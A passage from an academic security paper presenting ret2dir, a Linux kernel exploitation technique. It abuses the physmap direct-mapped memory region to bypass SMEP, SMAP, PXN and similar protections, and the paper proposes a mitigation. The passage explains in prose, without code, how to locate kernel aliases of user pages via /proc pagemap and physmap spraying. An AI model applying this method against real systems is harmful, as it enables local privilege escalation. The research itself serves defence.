memory disclosure\nvulnerabilities [13, 19], use-after-free and format string\nbugs [25, 27], signedness errors [17, 24], integer over-\nflows [10,16], race conditions [11,15], as well as missing\nauthorization checks and poor argument sanitization vul-\nnerabilities [18, 20\u201322]. The exploitation of these bugs\nis particularly effective, despite the existence of kernel\nprotection mechanisms, due to the weak separation be-\n\ftween user and kernel space. Although user programs\ncannot access directly kernel code or data, the opposite\nis not true, as the kernel is mapped into the address space\nof each process for performance reasons. This design\nallows an attacker with non-root access to execute code\nin privileged mode, or tamper-with critical kernel data\nstructures, by exploiting a kernel vulnerability and redi-\nrecting the control or data flow of the kernel to code or\ndata in user space. Attacks of this kind, known as return-\nto-user (ret2usr) [57], affect all major OSes, including\nWindows and Linux, and are applicable in x86\/x86-64,\nARM, and other popular architectures.\nIn response to ret2usr attacks, several protections have\nbeen developed to enforce strict address space separa-\ntion, such as PaX\u2019s KERNEXEC and UDEREF [77] and\nkGuard [57]. Having realized the importance of the prob-\nlem, Intel introduced Supervisor Mode Execute Protec-\ntion (SMEP) [46] and Supervisor Mode Access Preven-\ntion (SMAP) [54], two processor features that, when en-\nabled, prevent the execution (or access) of arbitrary user\ncode (or data) by the kernel. ARM has also introduced\nPrivileged Execute-Never (PXN) [4], a feature equiva-\nlent to SMEP. These features offer similar guarantees to\nsoftware protections with negligible runtime overhead.\nAlthough the above mechanisms prevent the explicit\nsharing of the virtual address space among user pro-\ncesses and the kernel, conditions of implicit data sharing\nstill exist. Fundamental OS components, such as physi-\ncal memory mappings, I\/O buffers, and the page cache,\ncan still allow user processes to influence what data is\naccessible by the kernel. In this paper, we study the\nabove problem in Linux, and expose design decisions\nthat trade stronger isolation for performance. Specif-\nically, we present a new kernel exploitation technique,\ncalled return-to-direct-mapped memory (ret2dir), which\nrelies on inherent properties of the memory management\nsubsystem to bypass existing ret2usr protections. This is\nachieved by leveraging a kernel region that directly maps\npart or all of a system\u2019s physical memory, enabling at-\ntackers to essentially \u201cmirror\u201d user-space data within the\nkernel address space.\nThe task of mounting a ret2dir attack is complicated\ndue to the different kernel layouts and memory manage-\nment characteristics of different architectures, the par-\ntial mapping of physical memory in 32-bit systems, and\nthe unknown location of the \u201cmirrored\u201d user-space data\nwithin the kernel. We present in detail different tech-\nniques for overcoming each of these challenges and con-\nstructing reliable ret2dir exploits against hardened x86,\nx86-64, AArch32, and AArch64 Linux targets.\nTo mitigate the effects of ret2dir attacks, we present\nthe design and implementation of an exclusive page\nframe ownership scheme for the Linux kernel, which\nprevents the implicit sharing of physical memory among\nuser processes and the kernel. The results of our evalua-\ntion show that the proposed defense offers effective pro-\ntection with minimal (<3%) runtime overhead.\nThe main contributions of this paper are the following:\n1. We expose a fundamental design weakness in the\nmemory management subsystem of Linux by intro-\nducing the concept of ret2dir attacks. Our exploita-\ntion technique bypasses all existing ret2usr pro-\ntections (SMEP, SMAP, PXN, KERNEXEC, UD-\nEREF, kGuard) by taking advantage of the kernel\u2019s\ndirect-mapped physical memory region.\n2. We introduce a detailed methodology for mount-\ning reliable ret2dir attacks against x86, x86-64,\nAArch32, and AArch64 Linux systems, along with\ntwo techniques for forcing user-space exploit pay-\nloads to \u201cemerge\u201d within the kernel\u2019s direct-mapped\nRAM area and accurately pinpointing their location.\n3. We experimentally evaluate the effectiveness of\nret2dir attacks using a set of nine (eight real-world\nand one artificial) exploits against different Linux\nkernel configurations and protection mechanisms.\nIn all cases, our transformed exploits bypass suc-\ncessfully the deployed ret2usr protections.\n4. We present the design, implementation, and evalu-\nation of an exclusive page frame ownership scheme\nfor the Linux kernel, which mitigates ret2dir attacks\nwith negligible (in most cases) runtime overhead.\n2 Background and Related Work\n2.1 Virtual Memory Organization in Linux\nDesigns for safely combining different protection do-\nmains range from putting the kernel and user processes\ninto a single address space and establishing boundaries\nusing software isolation [52], to confining user process\nand kernel components into separate, hardware-enforced\naddress spaces [2, 50, 66]. Linux and Linux-based OSes\n(Android [47], Firefox OS [72], Chrome OS [48]) adopt\na more coarse-grained variant of the latter approach, by\ndividing the virtual address space into kernel and user\nspace. In the x86 and 32-bit ARM (AArch32) architec-\ntures, the Linux kernel is typically mapped to the upper\n1GB of the virtual address space, a split also known as\n\u201c3G\/1G\u201d [28].1\nIn x86-64 and 64-bit ARM (AArch64)\nthe kernel is located in the upper canonical half [60,69].\nThis design minimizes the overhead of crossing pro-\ntection domains, and facilitates fast user-kernel interac-\ntions. When servicing a system call or handling an ex-\n1Linux also supports 2G\/2G and 1G\/3G splits. A patch for a 4G\/4G\nsplit in x86 [53] exists, but was never included in the mainline kernel\nfor performance reasons, as it requires a TLB flush per system call.\n\fception, the kernel is running within the context of a pre-\nempted process. Hence, flushing the TLB is not neces-\nsary [53], while the kernel can access user space directly\nto read user data or write the result of a system call.\n2.2 Return-to-user (ret2usr) Exploits\nAlthough kernel code and user software have both been\nplagued by common types of vulnerabilities [9], the exe-\ncution model imposed by the shared virtual memory lay-\nout between the kernel and user processes makes ker-\nnel exploitation noticeably different. The shared address\nspace provides a unique vantage point to local attack-\ners, as it allows them to control\u2014both in terms of per-\nmissions and contents\u2014part of the address space that is\naccessible by the kernel [91]. Simply put, attackers can\neasily execute shellcode with kernel rights by hijacking a\nprivileged execution path and redirecting it to user space.\nAttacks of this kind, known as return-to-user (ret2usr),\nhave been the de facto kernel exploitation technique (also\nin non-Linux OSes [88]) for more than a decade [36].\nIn a ret2usr attack, kernel data is overwritten with user\nspace addresses, typically after the exploitation of mem-\nory corruption bugs in kernel code [81], as illustrated\nin Figure 1. Attackers primarily aim for control data,\nsuch as return addresses [86], dispatch tables [36, 44],\nand function pointers [40,42,43,45], as they directly fa-\ncilitate arbitrary code execution [89]. Pointers to crit-\nical data structures stored in the kernel\u2019s heap [38] or\nthe global data section [44] are also common targets,\nas they allow attackers to tamper with critical data con-\ntained in these structures by mapping fake copies in user\nspace [38, 39, 41]. Note that the targeted data structures\ntypically contain function pointers or data that affect the\ncontrol flow of the kernel, so as to diverge execution to\narbitrary points. The end effect of all ret2usr attacks is\nthat the control or data flow of the kernel is hijacked and\nredirected to user space code or data [57].\nMost ret2usr exploits use a multi-stage shellcode, with\na first stage that lies in user space and \u201cglues\u201d together\nkernel functions (i.e., the second stage) for performing\nprivilege escalation or executing a rootshell. Technically,\nret2usr expects the kernel to run within the context of\na process controlled by the attacker for exploitation to\nbe reliable. However, kernel bugs have also been iden-\ntified and exploited in interrupt service routines [71]. In\nsuch cases, where the kernel is either running in interrupt\ncontext or in a process context beyond the attacker\u2019s con-\ntrol [37,85], the respective shellcode has to be injected in\nkernel space or be constructed using code gadgets from\nthe kernel\u2019s text in a ROP\/JOP fashion [8,51,87]. The lat-\nter approach is gaining popularity in real-world exploits,\ndue to the increased adoption of kernel hardening tech-\nniques [31,65,68,92,93,95].\nFigure 1: Operation of ret2usr attacks. A kernel code\nor data pointer is hijacked and redirected to controlled\ncode or data in user space (tampered-with data structures\nmay further contain pointers to code). Various protection\nmechanisms (KERNEXEC, UDEREF, kGuard, SMEP,\nSMAP, PXN) prevent arbitrary control flow transfers and\ndereferences from kernel to user space.\n2.3 Protections Against ret2usr Attacks\nReturn-to-user attacks are yet another incarnation of\nthe confused deputy problem [49]. Given the multi-\narchitecture [42, 83] and multi-OS [88] nature of the\nproblem, several defensive mechanisms exist for it. In\nthe remainder of this section, we discuss the ret2usr de-\nfenses available in Linux with the help of Figure 1.\nPaX: KERNEXEC and UDEREF are two features\nof the PaX [77] hardening patch set that prevent con-\ntrol flow transfers and dereferences from kernel to user\nspace. In x86, KERNEXEC and UDEREF rely on mem-\nory segmentation [78] to map the kernel space into a\n1GB segment that returns a memory fault whenever priv-\nileged code tries to dereference pointers to, or fetch in-\nstructions from, non-kernel addresses. In x86-64, due to\nthe lack of segmentation support, UDEREF\/amd64 [79]\nremaps user space memory into a different (shadow),\nnon-executable area when execution enters the kernel\n(and restores it on exit), to prevent user-space deref-\nerences. As the overhead of remapping memory is\nsignificant, an alternative for x86-64 systems is to en-\nable KERNEXEC\/amd64 [80], which has much lower\noverhead, but offers protection against only control-\nflow hijacking attacks. Recently, KERNEXEC and UD-\nEREF were ported to the ARM architecture [90], but the\npatches added support for AArch32 only and rely on the\ndeprecated MMU domains feature (discussed below).\nSMEP\/SMAP\/PXN: Supervisor Mode Execute Pro-\ntection (SMEP) [46] and Supervisor Mode Access Pre-\nvention (SMAP) [54] are two recent features of Intel\n\fprocessors that facilitate stronger address space separa-\ntion (latest kernels support both features [31,95]). SMEP\nprovides analogous protection to KERNEXEC, whereas\nSMAP operates similarly to UDEREF. Recently, ARM\nadded support for an SMEP-equivalent feature, dubbed\nPrivileged Execute-Never (PXN) [4], but Linux uses\nit only on AArch64. More importantly, on AArch32,\nPXN requires the MMU to operate on LPAE mode (the\nequivalent of Intel\u2019s Physical Address Extension (PAE)\nmode [55]), which disables MMU domains. Therefore,\nthe use of KERNEXEC\/UDEREF on AArch32 implies\ngiving up support for PXN and large memory (> 4GB).\nkGuard: kGuard [57] is a cross-platform compiler\nextension that protects the kernel from ret2usr attacks\nwithout relying on special hardware features. It enforces\nlightweight address space segregation by augmenting\n(at compile time) potentially exploitable control trans-\nfers with dynamic control-flow assertions (CFAs) that\n(at runtime) prevent the unconstrained transition of priv-\nileged execution paths to user space. The injected CFAs\nperform a small runtime check before every computed\nbranch to verify that the target address is always located\nin kernel space or loaded from kernel-mapped mem-\nory. In addition, kGuard incorporates code diversifica-\ntion techniques for thwarting attacks against itself.\n3 Attack Overview\nLinux follows a design that trades weaker kernel-to-user\nsegregation in favor of faster interactions between user\nprocesses and the kernel. The ret2usr protections dis-\ncussed in the previous section aim to alleviate this design\nweakness, and fortify the isolation between kernel and\nuser space with minimal overhead. In this work, we seek\nto assess the security offered by these protections and\ninvestigate whether certain performance-oriented design\nchoices can render them ineffective. Our findings indi-\ncate that there exist fundamental decisions, deeply rooted\ninto the architecture of the Linux memory management\nsubsystem (mm), which can be abused to weaken the\nisolation between kernel and user space. We introduce\na novel kernel exploitation technique, named return-to-\ndirect-mapped memory (ret2dir), which allows an at-\ntacker to perform the equivalent of a ret2usr attack on\na hardened system.\n3.1 Threat Model\nWe assume a Linux kernel hardened against ret2usr\nattacks using one (or a combination) of the protec-\ntion mechanisms discussed in Section 2.3. More-\nover, we assume an unprivileged attacker with local\naccess, who seeks to elevate privileges by exploiting\na kernel-memory corruption vulnerability [10\u201327] (see\nSection 2.2). Note that we do not make any assumptions\nabout the type of corrupted data\u2014code and data pointers\nare both possible targets [36,40,42\u201345,86]. Overall, the\nadversarial capabilities we presume are identical to those\nneeded for carrying out a ret2usr attack.\n3.2 Attack Strategy\nIn a kernel hardened against ret2usr attacks, the hijacked\ncontrol or data flow can no longer be redirected to user\nspace in a direct manner\u2014the respective ret2usr protec-\ntion scheme(s) will block any such attempt, as shown in\nFigure 1. However, the implicit physical memory sharing\nbetween user processes and the kernel allows an attacker\nto deconstruct the isolation guarantees offered by ret2usr\nprotection mechanisms, and redirect the kernel\u2019s control\nor data flow to user-controlled code or data.\nA key facility that enables the implicit sharing of phys-\nical memory is physmap: a large, contiguous virtual\nmemory region inside kernel address space that contains\na direct mapping of part or all (depending on the archi-\ntecture) physical memory. This region plays a crucial\nrole in enabling the kernel to allocate and manage dy-\nnamic memory as fast as possible (we discuss the struc-\nture of physmap in Section 4). We should stress that\nalthough in this study we focus on Linux\u2014one of the\nmost widely used OSes\u2014direct-mapped RAM regions\nexist (in some form) in many OSes, as they are consid-\nered standard practice in physical memory management.\nFor instance, Solaris uses the seg_kpm mapping facility\nto provide a direct mapping of the whole RAM in 64-bit\narchitectures [70].\nAs physical memory is allotted to user processes and\nthe kernel, the existence of physmap results in address\naliasing. Virtual address aliases, or synonyms [62], occur\nwhen two or more different virtual addresses map to the\nsame physical memory address. Given that physmap\nmaps a large part (or all) of physical memory within the\nkernel, the memory of an attacker-controlled user pro-\ncess is accessible through its kernel-resident synonym.\nThe first step in mounting a ret2dir attack is to map in\nuser space the exploit payload. Depending on whether\nthe exploited vulnerability enables the corruption of a\ncode pointer [36,40,42\u201345,86] or a data pointer [38,39,\n41], the payload will consist of either shellcode, or con-\ntrolled (tampered-with) data structures, as shown in Fig-\nure 2. Whenever the mm subsystem allocates (dynamic)\nmemory to user space, it actually defers giving page\nframes until the very last moment. Specifically, physi-\ncal memory is granted to user processes in a lazy manner,\nusing the demand paging and copy-on-write methods [7],\nwhich both rely on page faults to actually allocate RAM.\nWhen the content of the payload is initialized, the MMU\ngenerates a page fault, and the kernel allocates a page\n\fFigure 2: Overall ret2dir operation. The physmap\n(direct-mapped RAM) area enables a hijacked kernel\ncode or data pointer to access user-controlled data, with-\nout crossing the user-kernel space boundary.\nframe to the attacking process. Page frames are managed\nby mm using a buddy allocator [61]. Given the existence\nof physmap, the moment the buddy allocator provides\na page frame to be mapped in user space, mm effectively\ncreates an alias of the exploit payload in kernel space,\nas shown in Figure 2. Although the kernel never uses\nsuch synonyms directly, mm keeps the whole RAM pre-\nmapped in order to boost page frame reclamation. This\nallows newly deallocated page frames to be made avail-\nable to the kernel instantly, without the need to alter page\ntables (see Section 4.1 for more details).\nOverall, ret2dir takes advantage of the implicit\ndata sharing between user and kernel space (due to\nphysmap) to redirect a hijacked kernel control or data\nflow to a set of kernel-resident synonym pages, effec-\ntively performing the equivalent of a ret2usr attack with-\nout reaching out to user space. It is important to note\nthat the malicious payload \u201cemerges\u201d in kernel space the\nmoment a page frame is given to the attacking process.\nThe attacker does not have to explicitly \u201cpush\u201d (copy)\nthe payload to kernel space (e.g., via pipes or message\nqueues), as physmap makes it readily available. The\nuse of such methods is also much less flexible, as the sys-\ntem imposes strict limits to the amount of memory that\ncan be allocated for kernel-resident buffers, while the ex-\nploit payload will (most likely) have to be encapsulated\nin certain kernel data objects that can affect its structure.\n4 Demystifying physmap\nA critical first step in understanding the mechanics of\nret2dir attacks is to take a look at how the address\nspace of the Linux kernel is organized\u2014we use the x86\nplatform as a reference. The x86-64 architecture uses\n48-bit virtual addresses that are sign-extended to 64 bits\n(i.e., bits [48:63] are copies of bit [47]). This\nscheme natively splits the 64-bit virtual address space\nin two canonical halves of 128TB each. Kernel space\noccupies the upper half (0xFFFF800000000000 \u2013\n0xFFFFFFFFFFFFFFFF), and is further divided into\nsix regions [60]: the fixmap area, modules, kernel im-\nage, vmemmap space, vmalloc arena, and physmap.\nIn x86, on the other hand, the kernel space can be as-\nsigned to the upper 1GB, 2GB, or 3GB part of the ad-\ndress space, with the first option being the default. As\nkernel virtual address space is limited, it can become a\nscarce resource, and certain regions collide to prevent its\nwaste (e.g., modules and vmalloc arena, kernel image\nand physmap).2 For the purposes of ret2dir, in the fol-\nlowing, we focus only on the direct-mapped region.\n4.1 Functionality\nThe physmap area is a mapping of paramount impor-\ntance to the performance of the kernel, as it facilitates\ndynamic kernel memory allocation. At a high level,\nmm offers two main methods for requesting memory:\nvmalloc and kmalloc. With the vmalloc family\nof routines, memory can only be allocated in multiples\nof page size and is guaranteed to be virtually contigu-\nous but not physically contiguous. In contrast, with the\nkmalloc family of routines, memory can be allocated\nin byte-level chunks, and is guaranteed to be both virtu-\nally and physically contiguous.\nAs it offers memory only in page multiples, vmalloc\nleads to higher internal memory fragmentation and often\npoor cache performance. More importantly, vmalloc\nneeds to alter the kernel\u2019s page tables every time mem-\nory is (de)allocated to map or unmap the respective page\nframes to or from the vmalloc arena. This not only\nincurs additional overhead, but results in increased TLB\nthrashing [67]. For these reasons, the majority of ker-\nnel components use kmalloc. However, given that\nkmalloc can be invoked from any context, including\nthat of interrupt service routines, which have strict timing\nconstraints, it must satisfy a multitude of different (and\ncontradicting) requirements. In certain contexts, the al-\nlocator should never sleep (e.g., when locks are held). In\nother cases, it should never fail, or it should return mem-\nory that is guaranteed to be physically contiguous (e.g.,\nwhen a device driver reserves memory for DMA).\nGiven constraints like the above, physmap is a ne-\ncessity, as the main facilitator of optimal performance.\nThe mm developers opted for a design that lays kmalloc\n2To access the contents of a page frame, the kernel must first map\nthat frame in kernel space. In x86, however, the kernel has only 1GB \u2013\n3GB virtual addresses available for managing (up to) 64GB of RAM.\n\fArchitecture PHYS_OFFSET Size Prot.\nx86 (3G\/1G) 0xC0000000 891MB RW\n(2G\/2G) 0x80000000 1915MB RW\n(1G\/3G) 0x40000000 2939MB RW\nAArch32 (3G\/1G) 0xC0000000 760MB RWX\n(2G\/2G) 0x80000000 1784MB RWX\n(1G\/3G) 0x40000000 2808MB RWX\nx86-64 0xFFFF880000000000 64TB RW(X)\nAArch64 0xFFFFFFC000000000 256GB RWX\nTable 1: physmap characteristics across different ar-\nchitectures (x86, x86-64, AArch32, AArch64).\nover a region3 that pre-maps the entire RAM (or part\nof it) for the following reasons [7]. First, kmalloc\n(de)allocates memory without touching the kernel\u2019s page\ntable. This not only reduces TLB pressure significantly,\nbut also removes high-latency operations, like page table\nmanipulation and TLB shootdowns [70], from the fast\npath. Second, the linear mapping of page frames results\nin virtual memory that is guaranteed, by design, to be\nalways physically contiguous. This leads to increased\ncache performance, and has the added benefit of allowing\ndrivers to directly assign kmalloc\u2019ed regions to DMA\ndevices that can only operate on physically contiguous\nmemory (e.g., when there is no IOMMU support). Fi-\nnally, page frame accounting is greatly simplified, as ad-\ndress translations (virtual-to-physical and vice versa) can\nbe performed using solely arithmetic operations [64].\n4.2 Location and Size\nThe physmap region is an architecture-independentfea-\nture (this should come as no surprise given the reasons\nwe outlined above) that exists in all popular Linux plat-\nforms. Depending on the memory addressing character-\nistics of each ISA, the size of physmap and its exact\nlocation may differ. Nonetheless, in all cases: (i) there\nexists a direct mapping of part or all physical memory in\nkernel space, and (ii) the mapping starts at a fixed, known\nlocation. The latter is true even in the case where kernel-\nspace ASLR (KASLR) [35] is employed.\nTable 1 lists physmap\u2019s properties of interest for the\nplatforms we consider. In x86-64 systems, the physmap\nmaps directly in a 1:1 manner, starting from page frame\n3kmalloc is not directly layered over physmap. It is instead\nimplemented as a collection of geometrically distributed (32B\u20134KB)\nslabs, which are in turn placed over physmap. The slab layer is a hi-\nerarchical, type-based data structure caching scheme. By taking into\naccount certain factors, such as page and object sizes, cache line infor-\nmation, and memory access times (in NUMA systems), it can perform\nintelligent allocation choices that minimize memory fragmentation and\nmake the best use of a system\u2019s cache hierarchy. Linux adopted the\nslab allocator of SunOS [6], and as of kernel v3.12, it supports three\nvariants: SLAB, SLUB (default), and SLOB.\nzero, the entire RAM of the system into a 64TB region.\nAArch64 systems use a 256GB region for the same pur-\npose [69]. Conversely, in x86 systems, the kernel directly\nmaps only a portion of the available RAM.\nThe size of physmap on 32-bit architectures de-\npends on two factors: (i) the user\/kernel split used\n(3G\/1G, 2G\/2G, or 1G\/3G), and (ii) the size of the\nvmalloc arena. Under the default setting, in which\n1GB is assigned to kernel space and the vmalloc\narena occupies 120MB, the size of physmap is 891MB\n(1GB - sizeof(vmalloc + pkmap + fixmap\n+ unused)) and starts at 0xC0000000. Like-\nwise, under a 2G\/2G (1G\/3G) split, physmap starts\nat 0x80000000 (0x40000000) and spawns 1915MB\n(2939MB). The situation in AArch32 is quite simi-\nlar [59], with the only difference being the default size\nof the vmalloc arena (240MB).\nOverall, in 32-bit systems, the amount of di-\nrectly mapped physical memory depends on the size\nof RAM and physmap. If sizeof(physmap)\n\u2265 sizeof(RAM), then the entire RAM is direct-\nmapped\u2014a common case for 32-bit mobile devices\nwith up to 1GB of RAM. Otherwise, only up\nto sizeof(physmap)\/sizeof(PAGE) pages are\nmapped directly, starting from the first page frame.\n4.3 Access Rights\nA crucial aspect for mounting a ret2dir attack is the mem-\nory access rights of physmap. To get the protection\nbits of the kernel pages that correspond to the direct-\nmapped memory region, we built kptdump:4 a utility\nin the form of a kernel module that exports page tables\nthrough the debugfs pseudo-filesystem [29]. The tool\ntraverses the kernel page table, available via the global\nsymbols swapper_pg_dir (x86\/AArch32\/AArch64)\nand init_level4_pgt (x86-64), and dumps the flags\n(U\/S, R\/W, XD) of every kernel page that falls within the\nphysmap region.\nIn x86, physmap is mapped as \u201creadable and write-\nable\u201d (RW) in all kernel versions we tried (the oldest one\nwas v2.6.32, released on Dec. 2009). In x86-64, how-\never, the permissions of physmap are not in sane state.\nKernels up to v3.8.13 violate the W^X property by map-\nping the entire region as \u201creadable, writeable, and exe-\ncutable\u201d (RWX)\u2014only very recent kernels (\u2265 v3.9) use\nthe more conservative RW mapping. Finally, AArch32\nand AArch64 map physmap with RWX permissions in\nevery kernel version we tested (up to v3.12).\n4 kptdump resembles the functionality of Arjan van de Ven\u2019s\npatch [94]; unfortunately, we had to resort to a custom solution, as\nthat patch is only available for x86\/x86-64 and cannot be used \u201cas-is\u201d\nin any other architecture.\n\f5 Locating Synonyms\nThe final piece for mounting a ret2dir exploit is finding\na way to reliably pinpoint the location of a synonym ad-\ndress in the physmap area, given its user-space counter-\npart. For legacy environments, in which physmap maps\nonly part of the system\u2019s physical memory, such as a 32-\nbit system with 8GB of RAM, an additional requirement\nis to ensure that the synonym of a user-space address of\ninterest exists. We have developed two techniques for\nachieving both goals. The first relies on page frame infor-\nmation available through the pagemap interface of the\n\/proc filesystem, which is currently accessible by non-\nprivileged users in all Linux distributions that we studied.\nAs the danger of ret2dir attacks will (hopefully) encour-\nage system administrators and Linux distributions to dis-\nable access to pagemap, we have developed a second\ntechnique that does not rely on any information leakage\nfrom the kernel.\n5.1 Leaking PFNs (via \/proc)\nThe procfs pseudo-filesystem [58] has a long history\nof leaking security-sensitive information [56, 76]. Start-\ning with kernel v2.6.25 (Apr. 2008), a set of pseudo-\nfiles, including \/proc\/<pid>\/pagemap, were added\nin \/proc to enable the examination of page tables for\ndebugging purposes. To assess the prevalence of this fa-\ncility, we tested the latest releases of the most popular\ndistributions according to DistroWatch [34] (i.e., Debian,\nUbuntu, Fedora, and CentOS). In all cases, pagemap\nwas enabled by default.\nFor every user-space page, pagemap provides a 64-\nbit value, indexed by (virtual) page number, which con-\ntains information regarding the presence of the page\nin RAM [1]. If a page is present in RAM, then\nbit [63] is set and bits [0:54] encode its page\nframe number (PFN). That being so, the PFN of a\ngiven user-space virtual address uaddr, can be lo-\ncated by opening \/proc\/<pid>\/pagemap and read-\ning eight bytes from file offset (uaddr\/4096) *\nsizeof(uint64_t) (assuming 4KB pages).\nArmed with the PFN of a given uaddr, de-\nnoted as PFN(uaddr), its synonym SYN(uaddr)\nin physmap can be located using the following for-\nmula: SYN(uaddr) = PHYS_OFFSET + 4096 *\n(PFN(uaddr) - PFN_MIN). PHYS_OFFSET cor-\nresponds to the known, fixed starting kernel virtual\naddress of physmap (values for different configura-\ntions are shown in Table 1), and PFN_MIN is the first\npage frame number\u2014in many architectures, including\nARM, physical memory starts from a non-zero offset\n(e.g., 0x60000000 in Versatile Express ARM boards,\nwhich corresponds to PFN_MIN = 0x60000). To pre-\nvent SYN(uaddr) from being reclaimed (e.g., after\nswapping out uaddr), the respective user page can be\n\u201cpinned\u201d to RAM using mlock.\nsizeof(RAM) > sizeof(physmap): For sys-\ntems in which part of RAM is direct-mapped, only a\nsubset of PFNs is accessible through physmap. For\ninstance, in an x86 system with 4GB of RAM, the\nPFN range is 0x0-0x100000. However, under the\ndefault 3G\/1G split, the physmap region maps only\nthe first 891MB of RAM (see Table 1 for other se-\ntups), which means PFNs from 0x0 up to 0x37B00\n(PFN_MAX). If the PFN of a user-space address is greater\nthan PFN_MAX (the PFN of the last direct-mapped page),\nthen physmap does not contain a synonym for that ad-\ndress. Naturally, the question that arises is whether we\ncan force the buddy allocator to provide page frames with\nPFNs less than PFN_MAX.\nFor compatibility reasons, mm splits physical mem-\nory into several zones. In particular, DMA processors\nof older ISA buses can only address the first 16MB\nof RAM, while some PCI DMA peripherals can ac-\ncess only the first 4GB. To cope with such limita-\ntions, mm supports the following zones: ZONE_DMA,\nZONE_DMA32, ZONE_NORMAL, and ZONE_HIGHMEM.\nThe latter is available in 32-bit platforms and con-\ntains the page frames that cannot be directly ad-\ndressed by the kernel (i.e., those that are not mapped\nin physmap). ZONE_NORMAL contains page frames\nabove ZONE_DMA (and ZONE_DMA32, in 64-bit sys-\ntems) and below ZONE_HIGHMEM. When only part\nof RAM is direct-mapped, mm orders the zones\nas follows: ZONE_HIGHMEM > ZONE_NORMAL >\nZONE_DMA. Given a page frame request, mm will try\nto satisfy it starting with the highest zone that com-\nplies with the request (e.g., as we have discussed, the\ndirect-mapped memory of ZONE_NORMAL is preferred\nfor kmalloc), moving towards lower zones as long as\nthere are no free page frames available.\nFrom the perspective of an attacker, user processes\nget their page frames from ZONE_HIGHMEM first, as mm\ntries to preserve the page frames that are direct-mapped\nfor dynamic memory requests from the kernel. How-\never, when the page frames of ZONE_HIGHMEM are de-\npleted, due to increased memory pressure, mm inevitably\nstarts providing page frames from ZONE_NORMAL or\nZONE_DMA. Based on this, our strategy is as follows.\nThe attacking process repeatedly uses mmap to request\nmemory. For each page in the requested memory region,\nthe process causes a page fault by accessing a single\nbyte, forcing mm to allocate a page frame (alternatively,\nthe MAP_POPULATE flag in mmap can be used to pre-\nallocate all the respective page frames). The process then\nchecks the PFN of every allocated page, and the same\nprocedure is repeated until a PFN less than PFN_MAX is\n\fobtained. The synonym of such a page is then guaran-\nteed to be present in physmap, and its exact address can\nbe calculated using the formula presented above. Note\nthat depending on the size of physical memory and the\nuser\/kernel split used, we may have to spawn additional\nprocesses to completely deplete ZONE_HIGHMEM. For\nexample, on an x86 machine with 8GB of RAM and the\ndefault 3G\/1G split, up to three processes might be nec-\nessary to guarantee that a page frame that falls within\nphysmap will be acquired. Interestingly, the more be-\nnign processes are running on the system, the easier it\nis for an attacker to acquire a page with a synonym\nin physmap; additional tasks create memory pressure,\n\u201cpushing\u201d the attacker\u2019s allocations to the desired zones.\nContiguous synonyms: Certain exploits may require\nmore than a single page for their payload(s). Pages\nthat are virtually contiguous in user space, however,\ndo not necessarily map to page frames that are physi-\ncally contiguous, which means that their synonyms will\nnot be contiguous either. Yet, given physmap\u2019s lin-\near mapping, two pages with consecutive synonyms have\nPFNs that are sequential. Therefore, if 0xBEEF000 and\n0xFEEB000 have PFNs 0x2E7C2 and 0x2E7C3, re-\nspectively, then they are contiguous in physmap despite\nbeing \u223c64MB apart in user space.\nTo identify consecutive synonyms, we proceed as fol-\nlows. Using the same methodology as above, we com-\npute the synonym of a random user page. We then re-\npeatedly obtain more synonyms, each time comparing\nthe PFN of the newly acquired synonym with the PFNs\nof those previously retrieved. The process continues un-\ntil any two (or more, depending on the exploit) synonyms\nhave sequential PFNs. The exploit payload can then be\nsplit appropriately across the user pages that correspond\nto synonyms with sequential PFNs.\n5.2 physmap Spraying\nAs eliminating access to \/proc\/<pid>\/pagemap is\na rather simple task, we also consider the case in which\nPFN information is not available. In such a setting, given\na user page that is present in RAM, there is no direct\nway of determining the location of its synonym inside\nphysmap. Recall that our goal is to identify a kernel-\nresident page in the physmap area that \u201cmirrors\u201d a user-\nresident exploit payload. Although we cannot identify\nthe synonym of a given user address, it is still possible\nto proceed in the opposite direction: pick an arbitrary\nphysmap address, and ensure (to the extent possible)\nthat its corresponding page frame is mapped by a user\npage that contains the exploit payload.\nThis can be achieved by exhausting the address space\nof the attacking process with (aligned) copies of the ex-\nploit payload, in a way similar to heap spraying [33].\nThe base address and length of the physmap area is\nknown in advance (Table 1). The latter corresponds to\nPFN_MAX - PFN_MIN page frames, shared among all\nuser processes and the kernel. If the attacking process\nmanages to copy the exploit payload into N memory-\nresident pages (in the physical memory range mapped\nby physmap), then the probability (P) that an arbitrar-\nily chosen, page-aligned physmap address will point\nto the exploit payload is: P = N \/ (PFN_MAX -\nPFN_MIN). Our goal is to maximize P.\nSpraying: Maximizing N is straightforward, and\nboils down to acquiring as many page frames as pos-\nsible. The technique we use is similar to the one pre-\nsented in Section 5.1. The attacking process repeat-\nedly acquires memory using mmap and \u201csprays\u201d the ex-\nploit payload into the returned regions. We prefer us-\ning mmap, over ways that involve shmget, brk, and\nremap_file_pages, due to system limits typically\nimposed on the latter. MAP_ANONYMOUS allocations are\nalso preferred, as existing file-backed mappings (from\ncompeting processes) will be swapped out with higher\npriority compared to anonymous mappings. The copy-\ning of the payload causes page faults that result in page\nframe allocations by mm (alternatively MAP_POPULATE\ncan be used). If the virtual address space is not enough\nfor depleting the entire RAM, as is the case with certain\n32-bit configurations, the attacking process must spawn\nadditional child processes to assist with the allocations.\nThe procedure continues until mm starts swapping\n\u201csprayed\u201d pages to disk. To pinpoint the exact moment\nthat swapping occurs, each attacking process checks pe-\nriodically whether its sprayed pages are still resident\nin physical memory, by calling the getrusage sys-\ntem call every few mmap invocations. At the same\ntime, all attacking processes start a set of background\nthreads that repeatedly write-access the already allocated\npages, simulating the behavior of mlock, and prevent-\ning (to the extent possible) sprayed pages from being\nswapped out\u2014mm swaps page frames to disk using the\nLRU policy. Hence, by accessing pages repeatedly, mm\nis tricked to believe that they correspond to fresh con-\ntent. When the number of memory-resident pages begins\nto drop (i.e., the resident-set size (RSS) of the attacking\nprocess(es) starts decreasing), the maximum allowable\nphysical memory footprint has been reached. Of course,\nthe size of this footprint also depends on the memory\nload inflicted by other processes, which compete with the\nattacking processes for RAM.\nSignatures: As far as PFN_MAX - PFN_MIN is\nconcerned, we can reduce the set of potential target pages\nin the physmap region, by excluding certain pages that\ncorrespond to frames that the buddy allocator will never\nprovide to user space. For example, in x86 and x86-64,\nthe BIOS typically stores the hardware configuration de-\n\ftected during POST at page frame zero. Likewise, the\nphysical address range 0xA0000-0xFFFFF is reserved\nfor mapping the internal memory of certain graphics\ncards. In addition, the ELF sections of the kernel image\nthat correspond to kernel code and global data are loaded\nat known, fixed locations in RAM (e.g., 0x1000000\nin x86). Based on these and other predetermined allo-\ncations, we have generated physmap signatures of re-\nserved page frame ranges for each configuration we 